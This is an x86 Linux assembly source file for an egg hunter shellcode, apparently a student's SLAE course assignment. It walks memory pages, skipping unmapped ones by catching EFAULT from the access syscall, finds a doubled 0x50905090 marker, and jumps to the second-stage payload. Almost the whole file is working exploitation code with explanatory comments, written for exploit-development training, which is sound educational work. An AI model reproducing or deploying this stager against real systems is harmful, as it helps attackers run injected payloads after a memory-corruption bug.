; Filename: egg.nasm
; Author:   Stylianos Voukatas
; Website:  https://vostdev.wordpress.com/
;
; Purpose:  Assignment 3 for SLAE
; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/

; Student ID: PA-27669

global _start			

section .text
_start:

	xor edx,edx	; zero out edx

next_page:

	or dx,0xfff	; page alignment operation
	
next_address:

	inc edx		; increase edx to reach 4096

	lea ebx,[edx+0x4]; put address [edx+4] to ebx  
	push byte 0x21	; system call number for access
	pop eax		; prepare eax for the system call
	int 0x80	
	cmp al,0xf2	; check for EFAULT
	
	jz next_page	; go to the next page if flag is set, no access in this page
	mov eax,0x50905090; prepare to check against this egg value
	mov edi,edx
	;compare the contents of the memory stored in edi to the dword value that is currently in eax and increment edi by 4
	scasd		
	jnz next_address; if not our egg go to next address  
	scasd		; first check was our egg, check again if we reached the second stage payload
	jnz next_address; if eflags is not zero not our shellcode, continue searching
	jmp edi		; second stage payload found, jump there

